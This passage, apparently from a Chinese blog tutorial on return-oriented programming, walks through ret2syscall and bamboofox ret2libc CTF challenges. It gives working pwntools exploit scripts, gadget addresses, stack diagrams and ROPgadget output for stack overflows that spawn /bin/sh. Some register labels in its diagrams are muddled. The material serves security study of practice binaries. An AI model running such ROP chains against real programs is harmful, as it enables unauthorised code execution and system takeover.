class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./rop&#x27;</span>)</span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x80be408</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, pop_eax_ret, <span class=\"number\">0xb</span>, pop_edx_ecx_ebx_ret, <span class=\"number\">0</span>, <span class=\"number\">0</span>, binsh, int_0x80])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>栈布局</strong></p>\n<p>payload栈中部署：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |         int_0x80          | int_0x80指令部署(等待被执行)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |          bin_sh           | execve第一个参数部署(等待pop到edx中)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |            0              | execve第二个参数部署(等待pop到ecx中)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |            0              | execve第三个参数部署(等待pop到ebx中)</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |pop_edx_pop_ecx_pop_ebx_ret| 执行pop ebx、ecx、edx ret地址</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |           0xb             | 系统调用号部署（等待pop到eax寄存器中） </span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |       pop_eax_ret         | 执行pop eax ret地址，覆盖原ret返回位置</span><br><span class=\"line\">                     +---------------------------+</span><br><span class=\"line\">                     |           kdig            | &#x27;hollkdig&#x27;覆盖原saved ebp位置</span><br><span class=\"line\">              ebp---&gt;+---------------------------+</span><br><span class=\"line\">                     |           holl            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           ....            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           kdig            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           holl            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           kdig            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">                     |           holl            | &#x27;hollkdig&#x27;占位填满栈空间</span><br><span class=\"line\">v4终止位置,ebp-0x64--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>执行流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eip ---&gt; pop_eax_ret gadget地址\t\t\t\t   (由于pop_eax_ret覆盖了原ret地址，所以eip指向gadget并执行)</span><br><span class=\"line\">esp ---&gt; 0xb\t\t\t\t\t\t\t\t    (此时esp指向部署到栈中的0xb)</span><br><span class=\"line\">eax = 0xb\t\t\t\t\t\t\t\t\t\t(pop eax后将0xb压入eax寄存器)</span><br><span class=\"line\">eip ---&gt; pop_edx_pop_ecx_pop_ebx_ret gadget地址  </span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t     (由于pop eax结束后进行ret操作，所以eip继续指向第二个gadget并执行)</span><br><span class=\"line\">esp ---&gt; 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)</span><br><span class=\"line\">ebx = 0\t\t\t\t\t\t\t\t\t\t (pop ebx后将0压入ebx寄存器)</span><br><span class=\"line\">esp ---&gt; 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)</span><br><span class=\"line\">ecx = 0\t\t\t\t\t\t\t\t\t\t (pop ecx后将0压入ecx寄存器)</span><br><span class=\"line\">esp ---&gt; bin_sh地址\t\t\t \t\t        (此时esp指向部署到栈中的execve第三个参数bin_sh地址)</span><br><span class=\"line\">edx = bin_sh地址\t\t\t\t\t            (pop edx后将bin_sh地址压入eax寄)</span><br><span class=\"line\">执行int_0x80                                  (由于执行完pop ebx、ecx、edx后进行ret操作，所以eip指向最后的int)</span><br></pre></td></tr></table></figure>\n\n<p><strong>基本ROP</strong>-<strong>ret2libc</strong></p>\n<p>ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址。</p>\n<p><strong>以bamboofox中ret2libc1</strong></p>\n<p>1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2libc1 checksec ret2libc1    </span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.此外，利用ropgadget，我们可以查看是否有/bin/sh存在</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2libc1 ROPgadget --binary ret2libc1 --<span class=\"built_in\">string</span> <span class=\"string\">&#x27;/bin/sh&#x27;</span>          </span><br><span class=\"line\">Strings information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\"><span class=\"number\">0x08048720</span> : /bin/sh</span><br></pre></td></tr></table></figure>\n\n<p>确实存在，再次查找一下是否有system函数存在。经在ida中查找，确实也存在。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure>\n\n<p>4.那么，我们直接返回该处，即执行system函数。相应的payload如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc1&#x27;</span>)</span><br><span class=\"line\">binsh_addr = <span class=\"number\">0x8048720</span></span><br><span class=\"line\">system_plt = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">112</span>, system_plt, <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">4</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>这里我们需要注意函数调用栈的结构，如果是正常调用system函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’作为虚假的地址，其后参数对应的参数内容。</p>\n<p>这个例子，相对来说，最为简单，同时提供了system地址与/bin/sh的地址，但是大多数程序并不会有这么好的情况。</p>\n<p><strong>以bamboofox中的ret2libc2为例</strong></p>\n<p>1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2libc1 checksec ret2libc1    </span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n\n<p>2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(“/bin/sh”)。</p>\n<p>4.首先需要在bss段找一块地址写我们的/bin/sh的字符串，我们可以发现bss段有个buf2的变量，未被使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class=\"line\">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure>\n\n<p>那么构造如下： </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gets(buf2);</span><br><span class=\"line\">system(buf2);</span><br></pre></td></tr></table></figure>\n\n<p>那么先让返回地址为gets函数地址，参数为buf2地址，下一层返回地址需要弹出栈顶的buf2，然后跳到system地址去执行，那么就需要找一个pop|ret的gadget</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x0804872f : pop ebp ; ret</span><br><span class=\"line\">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0804843d : pop ebx ; ret</span><br><span class=\"line\">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x08048426 : ret</span><br><span class=\"line\">0x0804857e : ret 0xeac1</span><br><span class=\"line\">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>\n\n<p>这里我们选择0x0804843d这个地址</p>\n<p>5.利用脚本如下所示：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc2&#x27;</span>)</span><br><span class=\"line\">gets_plt = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">system_plt = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x0804843d</span></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class=\"number\">0xdeadbeef</span>, buf2])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，我这里向程序中bss段的buf2处写入/bin/sh字符串，并将其地址作为system的参数传入。这样以便于可以获得shell。</p>\n<p><strong>以bamboofox中的ret2libc3为例</strong></p>\n<p>在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。</p>\n<p>1.首先，查看安全保护。可以看出，源程序仍旧开启了堆栈不可执行保护。</p>\n<p>➜ ret2libc3 checksec ret2libc3<br>   Arch:   i386-32-little<br>   RELRO:  Partial RELRO<br>   Stack:  No canary found<br>   NX:    NX enabled<br>   PIE:   No PIE (0x8048000)</p>\n<p>2.进而查看源码，发现程序的bug仍然是栈溢出。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Can you find it !?&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.那么我们如何得到system函数的地址呢？这里就主要利用了两个知识点</p>\n<ul>\n<li>system函数属于libc，而libc.so文件中的函数之间相对偏移是固定的。</li>\n<li>即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而libc在github上有人进行收集（libc-database），具体细节如下</li>\n</ul>\n<p>所以如果我们知道libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system函数的地址。</p>\n<p>那么如何得到libc中的某个函数的地址呢？我们一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。<strong>当然，由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露。</strong></p>\n<p>我们自然可以根据上面的步骤先得到libc，之后在程序中查询偏移，然后再次获取system地址，但这样手工操作次数太多，有点麻烦，github上有一个libc的利用工具（LibcSearcher），具体细节请参考readme</p>\n<p>此外，在得到libc之后，其实libc中也是有/bin/sh字符串的，所以我们可以一起获得/bin/sh字符串的地址。</p>\n<p>4.这里我们泄露__libc_start_main的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>\n<ul>\n<li>泄露__libc_start_main地址</li>\n<li>获取libc版本(这里借助的是LibcSearcher)</li>\n<li>获取system地址与/bin/sh的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行system(‘/bin/sh’)</li>\n</ul>\n<p>exp如下???</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;get the related addr&quot;</span></span><br><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class=\"line\">libcbase = libc_start_main_addr - libc.dump(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;get shell&quot;</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">104</span>, system_addr, <span class=\"number\">0xdeadbeef</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>shell获取小结</strong></p>\n<p>这里总结几种常见的获取shell的方式：</p>\n<ul>\n<li><p>执行shellcode，这一方面也会有不同的情况</p>\n</li>\n<li><ul>\n<li>可以直接返回shell</li>\n<li>可以将shell返回到某一个端口</li>\n<li>shellcode中字符有时候需要满足不同的需求</li>\n<li><strong>注意，我们需要将shellcode写在可以执行的内存区域中。</strong></li>\n</ul>\n</li>\n<li><p>执行     system(“/bin/sh”), system(‘sh’) 等等</p>\n</li>\n<li><ul>\n<li><p>关于 system的地址，参见下面章节的<strong>地址寻找</strong>。</p>\n</li>\n<li><p>关于 “/bin/sh”,“sh”</p>\n</li>\n<li><ul>\n<li>首先寻找 binary 里面有没有对应的字符串，<strong>比如说有 flush 函数，那就一定有 sh 了</strong></li>\n<li>考虑个人读取对应字符串</li>\n<li>libc 中其实是有 /bin/sh 的</li>\n</ul>\n</li>\n<li><p>优点</p>\n</li>\n<li><ul>\n<li>只需要一个参数。</li>\n</ul>\n</li>\n<li><p>缺点</p>\n</li>\n<li><ul>\n<li><strong>有可能因为破坏环境变量而无法执行。</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>执行     execve(“/bin/sh”,NULL,NULL)</p>\n</li>\n<li><ul>\n<li><p>前几条同 system</p>\n</li>\n<li><p>优点</p>\n</li>\n<li><ul>\n<li>几乎不受环境变量的影响。</li>\n</ul>\n</li>\n<li><p>缺点</p>\n</li>\n<li><ul>\n<li><strong>需要 3 个参数。</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>系统调用</p>\n</li>\n<li><ul>\n<li>系统调用号 11(0xb)</li>\n</ul>\n</li>\n</ul>\n<p><strong>地址寻找小结</strong></p>\n<p>在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种</p>\n<p><strong>通用寻找</strong></p>\n<p><strong>直接地址寻找</strong></p>\n<p>程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</p>\n<p><strong>got表寻找</strong></p>\n<p>有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（<strong>前提是这个函数已经被解析一次了</strong>）。</p>\n<p><strong>有libc</strong></p>\n<p><strong>相对偏移寻找</strong>，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。<strong>注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。</strong>常见的有wapper的函数有（待补充）。    </p>\n<p><strong>无libc</strong></p>\n<p>其实，这种情况的解决策略分为两种</p>\n<ul>\n<li>想办法获取libc</li>\n<li>想办法直接获取对应的地址。</li>\n</ul>\n<p>而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。</p>\n<ul>\n<li>puts会有\\x00截断的问题</li>\n<li>write可以指定长度输出的内容。</li>\n</ul>\n<p>下面是一些相应的方法</p>\n<p><strong>DynELF</strong></p>\n<p>前提是我们可以泄露任意地址的内容。</p>\n<ul>\n<li><strong>如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。</strong></li>\n</ul>\n<p><strong>libc数据库</strong></p>\n<p>## 更新数据库<br> ./get<br> ## 将已有libc添加到数据库中<br> ./add libc.so<br> ## Find all the libc’s in the database that have the given names at the given addresses.<br> ./find function1 addr function2 addr<br> ## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.<br> ./Dump some useful offsets</p>\n<p>去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。</p>\n<ul>\n<li>libcdb.com</li>\n</ul>\n<p><strong>当然，还有上面提到的LibcSearcher。</strong></p>\n<p><strong>ret2dl-resolve</strong></p>\n<p>当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数（如：system）的解析。这也是我们在高级rop中会介绍的技巧。</p>\n<h3 id=\"中级了-o-￣▽￣-ブ！！！\"><a href=\"#中级了-o-￣▽￣-ブ！！！\" class=\"headerlink\" title=\"中级了@@@o(￣▽￣)ブ！！！\"></a>中级了@@@o(<em>￣▽￣</em>)ブ！！！</h3><p><strong>ret2__libc_scu_init</strong></p>\n<p>中级ROP主要是使用了一些比较巧妙的Gadgets。</p>\n<p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</span><br><span 